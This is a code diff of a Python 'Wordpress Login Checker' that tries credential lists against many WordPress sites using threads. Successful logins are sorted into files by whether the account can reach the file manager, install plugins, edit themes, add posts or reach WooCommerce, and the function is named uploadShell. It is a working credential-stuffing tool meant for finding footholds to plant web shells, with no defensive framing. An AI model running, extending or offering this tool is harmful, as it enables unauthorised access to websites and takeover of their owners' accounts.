@@ -1,20 +1,13 @@
-import sys
-import os
 import requests
 from multiprocessing.dummy import Pool as ThreadPool
+import argparse
 
 G = '\033[0;32m'
 W = '\033[0;37m'
 R = '\033[0;31m'
 C = '\033[1;36m'
 
-progress_file = 'progress.txt'
-
-def report_progress(progress):
-    with open(progress_file, 'w') as f:
-        f.write(f"{progress}\n")
-
-def uploadShell(site, total_sites, index):
+def uploadShell(site):
     asuna = site.replace('#', '|').replace('@', '|')
     try:
         site = asuna.split('|')[0]
@@ -23,58 +16,72 @@ def uploadShell(site, total_sites, index):
         hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.101 Safari/537.36'}
         r = requests.Session()
         cek = r.get(site, timeout=10)
-        if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
+        if cek.status_code in [200, 403] or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
             login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
-            if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
+            if any(x in login.text for x in ['wp-admin/profile.php', 'Found', '/wp-admin']):
+                print(f' {W}[{G}+{W}] {asuna} --> {G}Login Success!{W}')
                 with open('loginSuccess.txt', 'a') as saveLog:
                     saveLog.write(site + '#' + user + '@' + pasw + '\n')
+                if 'WooCommerce' in login.text:
+                    print(f' {W}[{G}+{W}] WooCommerce!')
+                    with open('WooCommerce.txt', 'a') as assz:
+                        assz.write(site + '#' + user + '@' + pasw + '\n')
                 if 'WP File Manager' in login.text:
-                    with open('wpfilemanager.txt', 'a') as assz:
-                        assz.write(site + '#' + user + '@' + pasw + '\n')
+                    print(f' {W}[{G}+{W}] WP File Manager!')
+                    if '403' in login.text or '403' in cek.text or login.status_code == 403:
+                        print(f' {W}[{R}!{W}] WP File Manager is Forbidden!')
+                    else:
+                        with open('wpfilemanager.txt', 'a') as assz:
+                            assz.write(site + '#' + user + '@' + pasw + '\n')
                 if 'plugin-install.php' in login.text:
-                    with open('plugin-install.txt', 'a') as assz:
-                        assz.write(site + '#' + user + '@' + pasw + '\n')
+                    print(f' {W}[{G}+{W}] Plugin install!')
+                    if '403' in login.text or '403' in cek.text or login.status_code == 403:
+                        print(f' {W}[{R}!{W}] Plugin install is Forbidden!')
+                    else:
+                        with open('plugin-install.txt', 'a') as assz:
+                            assz.write(site + '#' + user + '@' + pasw + '\n')
                 if 'theme-editor.php' in login.text:
-                    with open('wptheme.txt', 'a') as assz:
-                        assz.write(site + '#' + user + '@' + pasw + '\n')
+                    print(f' {W}[{G}+{W}] Theme Editor!')
+                    if '403' in login.text or '403' in cek.text or login.status_code == 403:
+                        print(f' {W}[{R}!{W}] Theme Editor is Forbidden!')
+                    else:
+                        with open('wptheme.txt', 'a') as assz:
+                            assz.write(site + '#' + user + '@' + pasw + '\n')
                 if 'post-new.php' in login.text:
+                    print(f' {W}[{G}+{W}] Add Page!')
                     with open('page.txt', 'a') as assz:
                         assz.write(site + '#' + user + '@' + pasw + '\n')
+                if 'post-new.php?post_type=post' in login.text:
+                    print(f' {W}[{G}+{W}] Add Artikel!')
+                    with open('artikel.txt', 'a') as assz:
+                        assz.write(site + '#' + user + '@' + pasw + '\n')
             else:
-                with open('failed.txt', 'a') as failLog:
-                    failLog.write(site + '#' + user + '@' + pasw + '\n')
+                print(f' {W}[{R}-{W}] {asuna} --> {R}Login Failed!{W}')
         else:
-            with open('invalid.txt', 'a') as invalidLog:
-                invalidLog.write(site + '#' + user + '@' + pasw + '\n')
+            print(f' {W}[{R}-{W}] {asuna} --> {R}Invalid Site!{W}')
     except Exception as e:
-        with open('failed.txt', 'a') as failLog:
-            failLog.write(f"{site}#{user}@{pasw} - Failed! ({e})\n")
-    finally:
-        progress = int((index / total_sites) * 100)
-        report_progress(progress)
+        print(f'\n {W}[{R}-{W}] {site} --> {R}Failed!{W} ({e})\n')
 
-def main(filename, thread_count):
+def main():
+    parser = argparse.ArgumentParser(description='Wordpress Login Checker')
+    parser.add_argument('filename', type=str, help='File containing list of websites')
+    parser.add_argument('threads', type=int, help='Number of threads')
+    args = parser.parse_args()
+
     try:
-        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
-            sites = file.read().splitlines()
-        total_sites = len(sites)
-        pool = ThreadPool(thread_count)
-        for i, site in enumerate(sites):
-            pool.apply_async(uploadShell, args=(site, total_sites, i + 1))
+        with open(args.filename, 'r', encoding='utf-8', errors='ignore') as file:
+            site = file.read().splitlines()
+        pool = ThreadPool(args.threads)
+        pool.map(uploadShell, site)
         pool.close()
         pool.join()
     except FileNotFoundError:
-        print(f'File {filename} tidak ditemukan.')
+        print(f'File {args.filename} not found.')
     except ValueError:
-        print('Masukkan jumlah thread yang valid.')
+        print('Enter a valid number of threads.')
     except Exception as e:
-        print(f'Terjadi kesalahan: {e}')
+        print(f'An error occurred: {e}')
 
-if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python wpcek.py <filename> <thread_count>")
-    else:
-        filename = sys.argv[1]
-        thread_count = int(sys.argv[2])
-        print(f"Running wpcek.py with file: {filename} and threads: {thread_count}")
-        main(filename, thread_count)
+if __name__ == '__main__':
+    print(f'{C}Wordpress Login Checker\nAuthor : gmfr{W}')
+    main()
